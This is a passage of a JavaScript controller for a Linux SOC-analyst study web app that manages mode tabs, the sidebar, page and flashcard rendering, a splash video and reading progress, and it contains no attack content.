// SAMRUDH SOC ANALYST - Application Controller

let activeMode = "notebook"; // "notebook" | "interview" | "cover" | "advanced"
let currentPageId = 1;
let currentQAId = 1;
let currentAdvancedPageId = parseInt(localStorage.getItem("advanced_current_page") || "1");
let currentCheatPageId = parseInt(localStorage.getItem("cheatsheet_current_page") || "1");
let bookmarkedPages = JSON.parse(localStorage.getItem("soc_bookmarked_pages") || "[]");
let bookmarkedAdvancedPages = JSON.parse(localStorage.getItem("adv_bookmarked_pages") || "[]");
let bookmarkedCheatPages = JSON.parse(localStorage.getItem("soc_bookmarked_cheatsheets") || "[]");
let bookmarkedQAs = JSON.parse(localStorage.getItem("soc_bookmarked_qas") || "[]");
let completedPages = JSON.parse(localStorage.getItem("soc_completed_pages") || "[]");
let completedAdvancedPages = JSON.parse(localStorage.getItem("advanced_completed_pages") || "[]");
let completedCheatPages = JSON.parse(localStorage.getItem("cheatsheet_completed_pages") || "[]");
let completedQAs = JSON.parse(localStorage.getItem("soc_completed_qas") || "[]");
let completedLabIds = JSON.parse(localStorage.getItem("soc_completed_labs") || "[]");
let currentFilter = "all";

// Sync state to global window object for feature extensions
function syncWindowState() {
  window.activeMode = activeMode;
  window.currentPageId = currentPageId;
  window.currentAdvancedPageId = currentAdvancedPageId;
  window.currentCheatPageId = currentCheatPageId;
  window.currentQAId = currentQAId;
}
syncWindowState();

document.addEventListener("DOMContentLoaded", () => {
  initLayoutMetrics();
  initSplashScreen();
  initPWA();
  initModeTabs();
  initSidebar();
  renderCurrentView();
  setupEventListeners();
  setupMobileNav();
});

// --- CINEMATIC VIDEO SPLASH SCREEN TRANSITION ---
function initSplashScreen() {
  const splash = document.getElementById("splash-screen");
  const video = document.getElementById("splash-video");

  if (!splash) return;

  // Accessibility: Respect prefers-reduced-motion
  const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  if (prefersReducedMotion) {
    splash.style.display = "none";
    document.body.classList.remove("splash-active");
    return;
  }

  document.body.classList.add("splash-active");

  let isSplashDone = false;

  const finishSplash = () => {
    if (isSplashDone) return;
    isSplashDone = true;
    clearTimeout(fallbackTimer);

    splash.classList.add("fade-out");
    document.body.classList.remove("splash-active");

    setTimeout(() => {
      splash.style.display = "none";
      if (video) {
        video.pause();
        video.removeAttribute("src");
        video.load();
      }
    }, 750);
  };

  // Keyboard shortcut to skip intro (Escape key)
  const onSplashKeyDown = (event) => {
    if (event.key === "Escape") {
      finishSplash();
      document.removeEventListener("keydown", onSplashKeyDown);
    }
  };
  document.addEventListener("keydown", onSplashKeyDown);

  if (video) {
    video.muted = true;
    video.playsInline = true;

    // Transition smoothly when video finishes playing
    video.addEventListener("ended", finishSplash, { once: true });

    // Handle video load / playback error gracefully
    video.addEventListener("error", () => {
      console.warn("Splash video failed to load, transitioning to dashboard.");
      finishSplash();
    }, { once: true });

    // Attempt playback
    const playPromise = video.play();
    if (playPromise !== undefined) {
      playPromise.catch((err) => {
        console.warn("Autoplay blocked or video play error:", err);
        finishSplash();
      });
    }
  } else {
    finishSplash();
  }

  // Safety fallback timeout (11 seconds max, for 10-second video)
  const fallbackTimer = setTimeout(finishSplash, 11000);
}

// --- MOBILE NAV SETUP ---
function setupMobileNav() {
  const sidebar   = document.getElementById("main-sidebar");
  const overlay   = document.getElementById("sidebar-overlay");

  // Sidebar overlay tap-to-close
  if (overlay) {
    overlay.addEventListener("click", () => {
      closeMobileSidebar();
    });
  }

  // Mobile bottom nav buttons
  const mobMenu = document.getElementById("mob-menu-btn");
  const mobPrev = document.getElementById("mob-prev-btn");
  const mobNext = document.getElementById("mob-next-btn");
  const mobPlay = document.getElementById("mob-play-btn");
  const mobTerm = document.getElementById("mob-terminal-btn");

  if (mobMenu) mobMenu.addEventListener("click", () => {
    sidebar.classList.toggle("mobile-open");
    overlay.classList.toggle("active");
    document.body.classList.toggle("drawer-open", sidebar.classList.contains("mobile-open"));
  });

  if (mobPrev) mobPrev.addEventListener("click", () => {
    if (activeMode === "notebook" && currentPageId > 1) {
      currentPageId--; renderCurrentView("prev"); updateActiveSidebarItem();
    } else if (activeMode === "interview" && currentQAId > 1) {
      currentQAId--; renderCurrentView("prev"); updateActiveSidebarItem();
    } else if (activeMode === "advanced" && currentAdvancedPageId > 1) {
      currentAdvancedPageId--;
      localStorage.setItem("advanced_current_page", currentAdvancedPageId);
      renderCurrentView("prev"); updateActiveSidebarItem();
    }
  });

  if (mobNext) mobNext.addEventListener("click", () => {
    if (activeMode === "notebook" && currentPageId < NOTEBOOK_PAGES.length) {
      currentPageId++; renderCurrentView("next"); updateActiveSidebarItem();
    } else if (activeMode === "interview" && currentQAId < INTERVIEW_QUESTIONS.length) {
      currentQAId++; renderCurrentView("next"); updateActiveSidebarItem();
    } else if (activeMode === "advanced" && currentAdvancedPageId < (window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456)) {
      currentAdvancedPageId++;
      localStorage.setItem("advanced_current_page", currentAdvancedPageId);
      renderCurrentView("next"); updateActiveSidebarItem();
    }
  });

  if (mobPlay) mobPlay.addEventListener("click", () => toggleAutoPlay());

  if (mobTerm) mobTerm.addEventListener("click", () => {
    document.getElementById("terminal-modal").classList.remove("hidden");
    document.getElementById("terminal-input").focus();
  });
}

function closeMobileSidebar() {
  const sidebar = document.getElementById("main-sidebar");
  const overlay = document.getElementById("sidebar-overlay");
  if (sidebar) sidebar.classList.remove("mobile-open");
  if (overlay) overlay.classList.remove("active");
  document.body.classList.remove("drawer-open");
}



// --- MODE TABS SWITCHER ---
function initModeTabs() {
  document.getElementById("tab-notebook").addEventListener("click", () => switchMode("notebook"));
  document.getElementById("tab-interview").addEventListener("click", () => switchMode("interview"));
  const mitreTab = document.getElementById("tab-mitre");
  if (mitreTab) mitreTab.addEventListener("click", () => switchMode("mitre"));
  const logTab = document.getElementById("tab-logparser");
  if (logTab) logTab.addEventListener("click", () => switchMode("logparser"));
  const hardTab = document.getElementById("tab-hardening");
  if (hardTab) hardTab.addEventListener("click", () => switchMode("hardening"));
  const cheatTab = document.getElementById("tab-cheatsheet");
  if (cheatTab) cheatTab.addEventListener("click", () => switchMode("cheatsheet"));
  const labsTab = document.getElementById("tab-labs");
  if (labsTab) labsTab.addEventListener("click", () => switchMode("labs"));
  const advancedTab = document.getElementById("tab-advanced");
  if (advancedTab) advancedTab.addEventListener("click", () => switchMode("advanced"));
  document.getElementById("tab-cover").addEventListener("click", () => switchMode("cover"));
}

function switchMode(mode) {
  stopSpeech();
  activeMode = mode;
  document.querySelectorAll(".mode-tab").forEach(tab => tab.classList.remove("active"));

  if (mode === "notebook") {
    document.getElementById("tab-notebook").classList.add("active");
    document.getElementById("page-type-label").innerText = "Page";
    document.getElementById("total-count-label").innerText = NOTEBOOK_PAGES.length;
    document.getElementById("page-number-input").max = NOTEBOOK_PAGES.length;
    document.getElementById("toolbar-controls").style.display = "flex";
  } else if (mode === "interview") {
    document.getElementById("tab-interview").classList.add("active");
    document.getElementById("page-type-label").innerText = "Q&A";
    document.getElementById("total-count-label").innerText = INTERVIEW_QUESTIONS.length;
    document.getElementById("page-number-input").max = INTERVIEW_QUESTIONS.length;
    document.getElementById("toolbar-controls").style.display = "flex";
  } else if (mode === "mitre") {
    const tab = document.getElementById("tab-mitre");
    if (tab) tab.classList.add("active");
    document.getElementById("toolbar-controls").style.display = "none";
  } else if (mode === "logparser") {
    const tab = document.getElementById("tab-logparser");
    if (tab) tab.classList.add("active");
    document.getElementById("toolbar-controls").style.display = "none";
  } else if (mode === "hardening") {
    const tab = document.getElementById("tab-hardening");
    if (tab) tab.classList.add("active");
    document.getElementById("toolbar-controls").style.display = "none";
  } else if (mode === "cheatsheet") {
    const tab = document.getElementById("tab-cheatsheet");
    if (tab) tab.classList.add("active");
    // Robustly resolve cheatsheet pages (support alternate global var shape)
    const cheatPages = window.CHEATSHEET_PAGES || (window.MASTER_CHEATSHEET_DATA && window.MASTER_CHEATSHEET_DATA.pages) || [];
    const cheatCount = cheatPages.length || 350;
    // Ensure currentCheatPageId is valid
    if (!Number.isFinite(currentCheatPageId) || currentCheatPageId < 1 || currentCheatPageId > cheatCount) {
      currentCheatPageId = 1;
      localStorage.setItem("cheatsheet_current_page", currentCheatPageId);
    }
    document.getElementById("page-type-label").innerText = "Cheat";
    document.getElementById("total-count-label").innerText = cheatCount;
    document.getElementById("page-number-input").max = cheatCount;
    document.getElementById("page-number-input").value = currentCheatPageId;
    document.getElementById("toolbar-controls").style.display = "flex";
  } else if (mode === "labs") {
    const tab = document.getElementById("tab-labs");
    if (tab) tab.classList.add("active");
    const labsCount = window.INCIDENT_LABS ? window.INCIDENT_LABS.length : 5;
    document.getElementById("page-type-label").innerText = "Lab Case";
    document.getElementById("total-count-label").innerText = labsCount;
    document.getElementById("page-number-input").max = labsCount;
    document.getElementById("page-number-input").value = currentActiveLabIndex + 1;
    document.getElementById("toolbar-controls").style.display = "flex";
  } else if (mode === "advanced") {
    const tab = document.getElementById("tab-advanced");
    if (tab) tab.classList.add("active");
    const advCount = window.ADVANCED_DOMAIN_PAGES ? window.ADVANCED_DOMAIN_PAGES.length : 456;
    document.getElementById("page-type-label").innerText = "Advanced";
    document.getElementById("total-count-label").innerText = advCount;
    document.getElementById("page-number-input").max = advCount;
    document.getElementById("page-number-input").value = currentAdvancedPageId;
    document.getElementById("toolbar-controls").style.display = "flex";
  } else if (mode === "cover") {
    document.getElementById("tab-cover").classList.add("active");
    document.getElementById("toolbar-controls").style.display = "none";
  }

  initSidebar();
  renderCurrentView();
}


// --- RENDER SIDEBAR CONTENT ---
function initSidebar() {
  const navContainer = document.getElementById("module-nav");
  navContainer.innerHTML = "";

  if (activeMode === "notebook") {
    NOTEBOOK_MODULES.forEach(mod => {
      const modGroup = createSidebarGroup(mod.title, mod.range);
      const pagesInMod = NOTEBOOK_PAGES.filter(p => p.moduleId === mod.id);
      
      pagesInMod.forEach(page => {
        const isSaved = bookmarkedPages.includes(page.id) ? "⭐ " : "";
        const item = createSidebarItem(page.id, `${isSaved}${page.concept}`, `P.${page.id}`, page.id === currentPageId, () => {
          currentPageId = page.id;
          renderCurrentView();
          updateActiveSidebarItem();
        });
        modGroup.appendChild(item);
      });
      navContainer.appendChild(modGroup);
    });
  } else if (activeMode === "interview") {
    INTERVIEW_CATEGORIES.forEach(cat => {
      const catGroup = createSidebarGroup(cat.title, "");
      const qasInCat = INTERVIEW_QUESTIONS.filter(q => q.catId === cat.id);
      
      qasInCat.forEach(qa => {
        const isSaved = bookmarkedQAs.includes(qa.id) ? "⭐ " : "";
        const item = createSidebarItem(qa.id, `${isSaved}${qa.question}`, `Q.${qa.id}`, qa.id === currentQAId, () => {
          currentQAId = qa.id;
          renderCurrentView();
          updateActiveSidebarItem();
        });
        catGroup.appendChild(item);
      });
      navContainer.appendChild(catGroup);
    });
  } else if (activeMode === "advanced") {
    const advModules = window.ADVANCED_DOMAIN_MODULES || [];
    const advPages = window.ADVANCED_DOMAIN_PAGES || [];

    advModules.forEach(mod => {
      const pagesInMod = advPages.filter(p => p.moduleId === mod.id);
      const modGroup = createSidebarGroup(mod.title, `${pagesInMod.length} Pgs`);
      
      pagesInMod.forEach(page => {
        const isSaved = bookmarkedAdvancedPages.includes(page.id) ? "⭐ " : "";
        const item = createSidebarItem(page.id, `${isSaved}${page.concept}`, `P.${page.id}`, page.id === currentAdvancedPageId, () => {
          currentAdvancedPageId = page.id;
          localStorage.setItem("advanced_current_page", currentAdvancedPageId);
          renderCurrentView();
          updateActiveSidebarItem();
        });
        modGroup.appendChild(item);
      });
      navContainer.appendChild(modGroup);
    });
  } else if (activeMode === "cheatsheet") {
    const csModules = window.CHEATSHEET_MODULES || (window.MASTER_CHEATSHEET_DATA && window.MASTER_CHEATSHEET_DATA.modules) || [];
    const csPages = window.CHEATSHEET_PAGES || (window.MASTER_CHEATSHEET_DATA && window.MASTER_CHEATSHEET_DATA.pages) || [];

    csModules.forEach(mod => {
      const pagesInMod = csPages.filter(p => p.moduleId === mod.id);
      const modGroup = createSidebarGroup(mod.title, `${pagesInMod.length} Pgs`);
      
      pagesInMod.forEach(page => {
        const isSaved = bookmarkedCheatPages.includes(page.id) ? "⭐ " : "";
        const isDone = completedCheatPages.includes(page.id) ? "✓ " : "";
        const item = createSidebarItem(page.id, `${isDone}${isSaved}${page.cmd} — ${page.title}`, `P.${page.id}`, page.id === currentCheatPageId, () => {
          currentCheatPageId = page.id;
          localStorage.setItem("cheatsheet_current_page", currentCheatPageId);
          renderCurrentView();
          updateActiveSidebarItem();
        });
        modGroup.appendChild(item);
      });
      navContainer.appendChild(modGroup);
    });
  } else if (activeMode === "labs") {
    const categories = window.INCIDENT_LAB_CATEGORIES || [];
    const labs = window.INCIDENT_LABS || [];
    
    categories.forEach(cat => {
      const labsInCat = labs.filter(l => l.categoryId === cat.id);
      const catGroup = createSidebarGroup(cat.title, `${labsInCat.length} Labs`);
      
      labsInCat.forEach(lab => {
        const isDone = completedLabIds.includes(lab.id) ? "✓ " : "";
        const item = createSidebarItem(`lab-${lab.id}`, `${isDone}${lab.severity === 'CRITICAL' ? '🚨' : '⚡'} ${lab.title}`, `Lab ${lab.labNumber}`, (lab.labNumber - 1) === currentActiveLabIndex, () => {
          currentActiveLabIndex = lab.labNumber - 1;
          renderCurrentView();
          updateActiveSidebarItem();
        });
        catGroup.appendChild(item);
      });
      navContainer.appendChild(catGroup);
    });
  } else if (activeMode === "cover") {
    navContainer.innerHTML = `
      <div style="padding:1rem; color:var(--text-ink); font-weight:600;">
        🏆 Official SAMRUDH SOC ANALYST Brand Cover & Certification Hub
      </div>
    `;
  }
}

function createSidebarGroup(title, range) {
  const grp = document.createElement("div");
  grp.className = "module-group";
  grp.innerHTML = `<div class="module-title">${title} ${range ? `(${range})` : ''}</div>`;
  return grp;
}

function createSidebarItem(id, labelText, badgeText, isActive, onClick) {
  const item = document.createElement("div");
  let isDone = false;
  if (activeMode === "interview") {
    isDone = completedQAs.includes(id);
  } else if (activeMode === "advanced") {
    isDone = completedAdvancedPages.includes(id);
  } else {
    isDone = completedPages.includes(id);
  }
  item.className = `page-item ${isActive ? 'active' : ''} ${isDone ? 'completed-item' : ''}`;
  item.setAttribute("data-item-id", id);
  item.innerHTML = `<span>${isDone ? '✓ ' : ''}${labelText}</span><span class="page-num">${badgeText}</span>`;
  item.addEventListener("click", onClick);
  return item;
}

function updateActiveSidebarItem() {
  let targetId = null;
  if (activeMode === "notebook") {
    targetId = currentPageId;
  } else if (activeMode === "interview") {
    targetId = currentQAId;
  } else if (activeMode === "advanced") {
    targetId = currentAdvancedPageId;
  }
  document.querySelectorAll(".page-item").forEach(item => {
    const id = parseInt(item.getAttribute("data-item-id"));
    if (id === targetId) {
      item.classList.add("active");
      item.scrollIntoView({ block: "nearest", behavior: "smooth" });
    } else {
      item.classList.remove("active");
    }
  });
}

// --- RENDER MAIN VIEW AREA (WITH 3D PAGE FLIP ANIMATION) ---
function renderCurrentView(direction = "next") {
  syncWindowState();
  const container = document.getElementById("notebook-paper-view");

  // 3D Book Page Flip Animation
  container.classList.remove("page-flip-next", "page-flip-prev");
  void container.offsetWidth; // Force reflow
  container.classList.add(direction === "next" ? "page-flip-next" : "page-flip-prev");
  setTimeout(() => container.classList.remove("page-flip-next", "page-flip-prev"), 450);

  if (activeMode === "notebook") {
    const page = NOTEBOOK_PAGES.find(p => p.id === currentPageId);
    if (page) {
      document.getElementById("page-number-input").value = currentPageId;
      updateBookmarkButtonState(currentPageId);
      container.innerHTML = generatePageHTML(page);
    }
  } else if (activeMode === "interview") {
    const qa = INTERVIEW_QUESTIONS.find(q => q.id === currentQAId);
    if (qa) {
      document.getElementById("page-number-input").value = currentQAId;
      updateBookmarkButtonState(currentQAId);
      container.innerHTML = generateInterviewQAHTML(qa);
    }
  } else if (activeMode === "mitre") {
    container.innerHTML = generateMitreMatrixHTML();
  } else if (activeMode === "logparser") {
    container.innerHTML = generateLogParserHTML();
  } else if (activeMode === "hardening") {
    container.innerHTML = generateHardeningHTML();
  } else if (activeMode === "cheatsheet") {
    const csPages = window.CHEATSHEET_PAGES || (window.MASTER_CHEATSHEET_DATA && window.MASTER_CHEATSHEET_DATA.pages) || [];
    const page = csPages.find(p => p.id === currentCheatPageId) || csPages[0];
    if (page) {
      document.getElementById("page-number-input").value = currentCheatPageId;
      updateBookmarkButtonState(currentCheatPageId);
      container.innerHTML = generateCheatPageHTML(page);
    }
  } else if (activeMode === "labs") {
    container.innerHTML = generateIncidentLabsHTML();
  } else if (activeMode === "advanced") {
    const advPages = window.ADVANCED_DOMAIN_PAGES || [];
    const page = advPages.find(p => p.id === currentAdvancedPageId);
    if (page) {
      document.getElementById("page-number-input").value = currentAdvancedPageId;
      updateBookmarkButtonState(currentAdvancedPageId);
      container.innerHTML = generateAdvancedPageHTML(page);
    }
  } else if (activeMode === "cover") {
    container.innerHTML = generateBrandCoverHTML();
  }

  updateReadingProgress();
  applySearchHighlights();
  updateActiveSidebarItem();
}

// --- GENERATE PAGE HTML (WITH BRAND WATERMARK, PUBLISHED AUTHOR HEROES, SOC TIPS & VISUALS) ---
function generatePageHTML(page) {
  const isFirstPage = page.id === 1;
  const isLastPage = page.id === 365;

  return `
    <article class="ruled-paper">
      <img src="logo.png" alt="LINUX SOC HANDBOOK" class="brand-watermark-stamp" />

      ${isFirstPage ? `
        <div style="background: linear-gradient(135deg, rgba(56, 189, 248, 0.15), rgba(168, 85, 247, 0.15)); border: 2px solid var(--accent-blue); padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
          <img src="logo.png" style="width: 80px; height: 80px; margin-bottom: 0.5rem;" />
          <h1 style="font-family: 'Outfit', sans-serif; color: var(--accent-blue); font-size: 1.8rem; margin: 0;">📖 LINUX SOC HANDBOOK — 365-PAGE MASTER HANDBOOK</h1>
          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">OFFICIAL PUBLISHED HANDBOOK FOR LINUX & BLUE TEAM SECURITY OPERATIONS</p>
          <div style="display: flex; justify-content: center; gap: 1rem; margin-top: 0.8rem; font-size: 0.85rem;">
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">📚 365 Master Pages</span>
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🗣️ Telugu + English Mix</span>
            <span style="background: var(--bg-app); border: 1px solid var(--card-border); padding: 0.3rem 0.8rem; border-radius: 20px;">🛡️ Tier-1 SOC Analyst Ready</span>
          </div>
        </div>
      ` : ''}

      ${isLastPage ? `
        <div style="background: linear-gradient(135deg, rgba(234, 179, 8, 0.18), rgba(34, 197, 94, 0.18)); border: 2px solid #eab308; padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; text-align: center;">
          <div style="font-size: 3rem; margin-bottom: 0.2rem;">🏆 🎓 🛡️</div>
          <h1 style="font-family: 'Outfit', sans-serif; color: #eab308; font-size: 2rem; margin: 0;">OFFICIAL CERTIFICATION & GRADUATION BLUEPRINT</h1>
          <p style="font-weight: 700; color: var(--text-ink); margin-top: 0.4rem;">CONGRATULATIONS ON MASTERING ALL 365 PAGES OF THE LINUX SOC CURRICULUM!</p>
          <div style="display: flex; justify-content: center; gap: 1rem; margin-top: 0.8rem; font-size: 0.85rem;">
            <span style="background: #eab308; color: #000; font-weight: bold; padding: 0.4rem 1rem; border-radius: 20px;">SEAL OF COMPLETION</span>
            <span style="background: #22c55e; color: #fff; font-weight: bold; padding: 0.4rem 1rem; border-radius: 20px;">BLUE TEAM TIER-1 CERTIFIED</span>
          </div>
        </div>
      ` : ''}

      <header class="page-header-row">
        <div class="concept-title-box">
          <h2>${page.concept}</h2>
          <span class="concept-tag">${getModuleName(page.moduleId)}</span>
        </div>
        <div class="page-stamp">PAGE ${page.id}</div>
      </header>

      <div class="section-block">
        <div class="section-label">💡 SIMPLE EXPLANATION (TELUGU-ENGLISH)</div>
        <p class="handwritten-text">"${page.explanation}"</p>
      </div>

      <div class="section-block">
        <div class="section-label">⚡ WHY IT MATTERS (SOC PERSPECTIVE)</div>
        <p class="handwritten-text">"${page.whyItMatters}"</p>
      </div>

      <div class="section-block">
        <div class="section-label">💻 LINUX COMMAND & SYNTAX</div>
        <div class="syntax-box">SYNTAX: ${escapeHTML(page.syntax)}</div>
        <div class="cmd-box">$ ${escapeHTML(page.command)}</div>
      </div>

      <div class="section-block">
        <div class="section-label">🖥️ TERMINAL EXAMPLE & OUTPUT</div>
        <div class="cmd-box">${escapeHTML(page.example)}</div>
        <p class="handwritten-text">"${page.cmdExplanation}"</p>
      </div>

      <div class="section-block">
        <div class="section-label">🛡️ SOC WORKFLOW & INCIDENT USE CASE</div>
        <p class="handwritten-text">"${page.socUse}"</p>
      </div>

      ${page.id % 15 === 0 ? VISUAL_DIAGRAMS.webshellFlow : ''}
      ${page.id % 20 === 0 ? VISUAL_DIAGRAMS.killchain : ''}

      ${page.noteVisual ? `
        <div class="section-block">
          <div class="section-label">✏️ HANDWRITTEN VISUAL DIAGRAM / SUMMARY</div>
          <div class="diagram-box">${escapeHTML(page.noteVisual)}</div>
        </div>
      ` : ''}

      <div class="pro-tip-box" style="margin-bottom: 1rem;">
        💡 <strong>SOC ANALYST PRO-TIP:</strong> ${escapeHTML(page.remember)}
      </div>

      <div class="sticky-note">
        "🧪 <strong>TRY IT PRACTICAL EXERCISE:</strong> Open terminal, run <code>${escapeHTML(page.command)}</code>, and observe output log timestamps."
      </div>

      <div class="page-completion-footer">
        <button class="btn-mark-complete ${completedPages.includes(page.id) ? 'completed' : ''}" onclick="togglePageCompletion('notebook', ${page.id})">
          ${completedPages.includes(page.id) ? '✓ Completed' : '☑️ Mark as Complete'}
        </button>
      </div>
    </article>
  `;
}

function generateAdvancedHTML() {
  return `
    <article class="advanced-locked-card" style="background: var(--paper-bg, #fffdf5); border: 2px solid var(--card-border, #e0d7c3); border-radius: 16px; padding: 2.2rem; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06); text-align: center; max-width: 860px; margin: 1rem auto;">
      
      <div style="display: inline-flex; align-items: center; gap: 0.5rem; background: linear-gradient(135deg, rgba(239, 68, 68, 0.12), rgba(245, 158, 11, 0.12)); border: 1.5px solid #f59e0b; color: #b45309; padding: 0.45rem 1.1rem; border-radius: 30px; font-weight: 800; font-size: 0.85rem; margin-bottom: 1.4rem;">
        <span>🔒 ADVANCED DOMAIN — COMING SOON (LOCKED PREVIEW)</span>
      </div>

      <h1 style="font-family: var(--font-sans, 'Outfit', sans-serif); font-size: 1.85rem; font-weight: 800; color: var(--accent-blue, #1565c0); margin: 0 0 0.6rem 0;">
        💻 Advanced Terminal & Lab Simulation
      </h1>

      <p style="font-size: 0.98rem; color: var(--text-ink, #1a237e); font-weight: 600; max-width: 680px; margin: 0 auto 2.2rem auto; line-height: 1.5;">
        Get a sneak peek at the upcoming hands-on simulation module designed for Tier-2/3 Blue Team Threat Hunting and Real-Time Terminal Defense.
      </p>

      <!-- GLIMPSE FEATURE SECTIONS REQUIRED BY USER -->
      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.2rem; text-align: left; margin-bottom: 2.2rem;">
        
        <!-- 1. Interactive Command Prompt -->
        <div style="background: var(--bg-app, #f4edd9); border: 1.5px solid var(--card-border, #e0d7c3); border-radius: 12px; padding: 1.4rem;">
          <div style="font-size: 2.2rem; margin-bottom: 0.5rem;">💻</div>
          <h3 style="font-family: var(--font-sans, 'Outfit', sans-serif); color: var(--accent-blue, #1565c0); font-size: 1.05rem; font-weight: 800; margin-bottom: 0.4rem;">
            1. Interactive Command Prompt
          </h3>
          <p style="font-size: 0.85rem; color: var(--text-dark, #212121); line-height: 1.48;">
            Upgrade the static terminal UI into a functional sandbox where users can actually type and execute live commands (<code>grep</code>, <code>awk</code>, <code>sed</code>, <code>cat /var/log/auth.log</code>).
          </p>
        </div>

        <!-- 2. Scenario-Based Labs -->
        <div style="background: var(--bg-app, #f4edd9); border: 1.5px solid var(--card-border, #e0d7c3); border-radius: 12px; padding: 1.4rem;">
          <div style="font-size: 2.2rem; margin-bottom: 0.5rem;">🛡️</div>
          <h3 style="font-family: var(--font-sans, 'Outfit', sans-serif); color: var(--accent-blue, #1565c0); font-size: 1.05rem; font-weight: 800; margin-bottom: 0.4rem;">
            2. Scenario-Based Labs
          </h3>
          <p style="font-size: 0.85rem; color: var(--text-dark, #212121); line-height: 1.48;">
            Create simulated incident response scenarios where the user must type the correct sequence of Linux commands to "defend" the server or find the malicious IP.
          </p>
        </div>

        <!-- 3. Real-Time Command Validation -->
        <div style="background: var(--bg-app, #f4edd9); border: 1.5px solid var(--card-border, #e0d7c3); border-radius: 12px; padding: 1.4rem;">
          <div style="font-size: 2.2rem; margin-bottom: 0.5rem;">⚡</div>
          <h3 style="font-family: var(--font-sans, 'Outfit', sans-serif); color: var(--accent-blue, #1565c0); font-size: 1.05rem; font-weight: 800; margin-bottom: 0.4rem;">
            3. Real-Time Command Validation
          </h3>
          <p style="font-size: 0.85rem; color: var(--text-dark, #212121); line-height: 1.48;">
            Provide instant success/fail feedback when they attempt terminal challenges, with telemetry feedback and step-by-step triage guidance.
          </p>
        </div>

      </div>

      <!-- ACTIVE PRACTICAL NAVIGATION -->
      <div style="background: linear-gradient(135deg, rgba(21, 101, 192, 0.08), rgba(2, 132, 199, 0.08)); border: 1.5px dashed var(--accent-blue); padding: 1.4rem; border-radius: 12px; display: flex; flex-direction: column; align-items: center; gap: 0.8rem;">
        <div style="font-weight: 700; font-size: 0.9rem; color: var(--text-ink);">
          🚀 Practice interactive terminal commands & incident challenges in the current active modules:
        </div>
        <div style="display: flex; gap: 0.8rem; flex-wrap: wrap; justify-content: center;">
          <button onclick="document.getElementById('terminal-modal').classList.remove('hidden'); document.getElementById('terminal-input').focus();" class="btn-action btn-cyber" style="padding: 0.6rem 1.2rem; font-size: 0.88rem;">
            💻 Open Interactive Terminal Sandbox
          </button>
          <button onclick="switchMode('labs')" class="btn-action btn-voice" style="padding: 0.6rem 1.2rem; font-size: 0.88rem;">
            🚩 Open Incident Response Labs
          </button>
        </div>
      </div>

    </article>
  `;
}




// --- GENERATE INTERVIEW Q&A HTML (3D Flip Flashcards) ---
function generateInterviewQAHTML(qa) {
  return `
    <div class="flashcard-3d-wrapper" onclick="if (!window.getSelection().toString()) this.classList.toggle('flipped')">
      <div class="flashcard-inner">
        
        <!-- FRONT OF FLASHCARD (Matches User Image 2) -->
        <div class="flashcard-front">
          <div class="flashcard-header">
            <div>
              <h2 class="flashcard-question-title">${escapeHTML(qa.question).toUpperCase()}</h2>
              <span class="flashcard-question-badge">QUESTION #${qa.id}</span>
            </div>
            <img src="logo.png" alt="SAMRUDH SOC" class="flashcard-logo-badge" />
          </div>
          
          <div class="flashcard-click-hint">
            <span>👆 Click card to reveal answer</span>
          </div>
        </div>

        <!-- BACK OF FLASHCARD (Full Answer Breakdown) -->
        <div class="flashcard-back">
          <div class="flashcard-header">
            <div>
              <h2 class="flashcard-question-title" style="font-size: 1.1rem; text-transform: none;">${escapeHTML(qa.question)}</h2>
              <span class="flashcard-question-badge">QUESTION #${qa.id}</span>
            </div>
            <span class="flashcard-flip-badge">🔄 Flip Back</span>
          </div>

          <div class="qa-intent-box" style="margin-top: 1rem;">
            🎯 <strong>INTERVIEWER INTENT:</strong> ${escapeHTML(qa.intent)}
          </div>

          <div class="section-block" style="margin-top: 0.8rem;">
            <div class="section-label">🗣️ TELUGU-ENGLISH EXPLANATION (EASY UNDERSTANDING)</div>
            <p class="handwritten-text">"${qa.explanation}"</p>
          </div>

          <div class="section-block">
            <div class="section-label">💬 IDEAL ENGLISH ANSWER TO SPEAK IN INTERVIEW</div>
            <div class="qa-ideal-box">"${escapeHTML(qa.idealAnswer)}"</div>
          </div>

          <div class="section-block">
            <div class="section-label">💻 REAL-WORLD SCENARIO / LOG COMMAND</div>
            <div class="cmd-box">${escapeHTML(qa.example)}</div>
          </div>

          <div class="pro-tip-box">
            💡 <strong>PRO-TIP TO STAND OUT:</strong> ${escapeHTML(qa.proTip)}
          </div>

          <div class="page-completion-footer" style="margin-top: 1.2rem;">
            <button class="btn-mark-complete ${completedQAs.includes(qa.id) ? 'completed' : ''}" onclick="event.stopPropagation(); togglePageCompletion('interview', ${qa.id})">
              ${completedQAs.includes(qa.id) ? '✓ Completed' : '☑️ Mark as Complete'}
            </button>
          </div>

          <div class="flashcard-click-hint" style="margin-top: 1rem;">
            <span>🔄 Click card to flip back to question</span>
          </div>
        </div>

      </div>
    </div>
  `;
}

// --- READING PROGRESS & SEARCH HIGHLIGHT HELPERS ---
function updateReadingProgress() {
  const progressBar = document.getElementById("reading-progress-bar");
  const progressLabel = document.getElementById("progress-percentage-label");
  const progressContainer = document.getElementById("reading-progress-container");

  if (!progressBar || !progressContainer) return;

  if (activeMode === "notebook" || activeMode === "interview" || activeMode === "advanced") {
    progressContainer.style.display = "block";
    let pct = 0;
    if (activeMode === "notebook" && typeof NOTEBOOK_PAGES !== "undefined" && NOTEBOOK_PAGES.length) {
      pct = Math.round((currentPageId / NOTEBOOK_PAGES.length) * 100);
    } else if (activeMode === "interview" && typeof INTERVIEW_QUESTIONS !== "undefined" && INTERVIEW_QUESTIONS.length) {
      pct = Math.round((currentQAId / INTERVIEW_QUESTIONS.length) * 100);
    } else if (activeMode === "advanced" && typeof ADVANCED_DOMAIN_PAGES !== "undefined" && ADVANCED_DOMAIN_PAGES.length) {
      pct = Math.round((currentPageId / ADVANCED_DOMAIN_PAGES.length) * 100);
    }
    progressBar.style.width = pct + "%";
    if (progressLabel) progressLabel.innerText = pct + "%";
